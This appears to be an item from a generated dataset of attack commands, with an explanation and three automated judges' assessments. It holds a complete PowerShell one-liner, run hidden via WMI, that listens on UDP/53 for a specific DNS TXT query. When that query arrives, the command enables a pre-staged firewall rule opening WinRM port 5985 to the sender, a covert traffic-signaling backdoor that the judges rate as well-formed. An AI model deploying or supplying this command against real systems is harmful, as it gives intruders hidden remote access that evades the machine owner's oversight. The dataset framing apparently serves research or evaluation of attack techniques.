command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(53); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 20){ $p=12; $n=''; while($p -lt $d.Length){ $l=$d[$p]; if($l -eq 0){$p++; break}; $p++; $n += [Text.Encoding]::ASCII.GetString($d,$p,$l)+''.''; $p+=$l }; if($n -eq ''updates.windows.local.''){ $qt=($d[$p]*256)+$d[$p+1]; if($qt -eq 16){ Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -Enabled True -RemoteAddress $ep.Address; break } } } } }'
explanation: Parses DNS on UDP/53 to detect a TXT query for 'updates.windows.local.' (application-specific DNS wire format: QNAME/QTYPE=TXT). On match, enables a Windows Firewall rule for WinRM HTTP (5985), scoping to the signaled source.
rationale_steps: Create disabled firewall rule for TCP/5985.
Listen on UDP/53 and parse DNS header/question to extract QNAME and QTYPE.
If QNAME matches and QTYPE=TXT (16), enable rule and restrict to source IP.

llm_judgments.syntactic_justification: Command is well-formed with balanced braces and correctly escaped single quotes, valid PowerShell cmdlets/flags, and a plausible -Command & { } invocation.
llm_judgments.semantic_justification: It implements DNS-based traffic signaling to trigger enabling a scoped WinRM firewall rule (T1205) by parsing QNAME/QTYPE from UDP/53, but relies on binding to port 53 and creating/modifying firewall rules which typically require administrative privileges, conflicting with 'Privilege: None'.

llm_judgments.syntactic_justification: The command is largely well-formed with balanced braces and quotes, though the deeply nested quoting (single quotes within double-quoted ArgumentList within WMI invocation) creates edge cases where PowerShell string escaping with doubled single quotes (''Signal-Open-WinRM-HTTP-TXT'') may behave inconsistently depending on execution context.
llm_judgments.semantic_justification: The command precisely implements T1205 Traffic Signaling by binding a raw UDP socket on port 53, parsing DNS wire format to detect a TXT query for 'updates.windows.local.', and using that signal to enable a pre-staged firewall rule for WinRM (5985) scoped to the signaling source IP, which is a textbook knock-based port-knocking/traffic-signaling C2 activation mechanism.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax, properly balanced braces and parentheses, and valid escaping for single quotes within the WMI argument string.
llm_judgments.semantic_justification: The command accurately implements the traffic signaling technique by manually parsing the DNS wire format on UDP/53 to identify a specific TXT query, then dynamically modifying firewall rules based on the source IP of that query. The DNS parsing logic (byte-by-byte label reading and QTYPE validation) is technically precise.
